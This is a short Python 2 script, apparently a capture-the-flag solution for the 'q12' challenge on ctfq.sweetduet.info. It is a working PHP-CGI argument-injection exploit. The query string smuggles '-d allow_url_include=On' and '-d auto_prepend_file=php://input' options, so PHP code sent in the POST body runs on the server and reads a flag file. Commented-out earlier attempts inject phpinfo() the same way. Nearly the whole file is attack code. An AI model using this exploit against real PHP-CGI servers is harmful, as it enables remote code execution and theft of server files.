import requests
#data = urllib.urlencode({'-d auto_prepend_file':'php://input', \
#                         '-d allow_url_include':'On'})
#data += '\r\n\r\n<?php phpinfo() ?>'
#print data
#res = urllib2.urlopen('http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include=On&-d+auto_prepend_file=php%3A%2F%2Finput','<?php phpinfo ?>')
#print res.read()

#http://ctfq.sweetduet.info:10080/~q12/?-d+allow_url_include=On&-d+auto_prepend_file=php%3A%2F%2Finput

param = "?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input"
url = 'http://ctfq.sweetduet.info:10080/~q12/index.php' + param
headers = {                   # Set the appropriate headers for the response
    'Host': "ctfq.sweetduet.info:10080",
    'User-Agent': 'Mozilla',
    'Connection': 'keep-alive'
    }
data = """
<?php
    echo file_get_contents("flag_flag_flag.txt");
?>
"""[1:-1]
req = requests.post(url,headers=headers,data=data)
print req.text
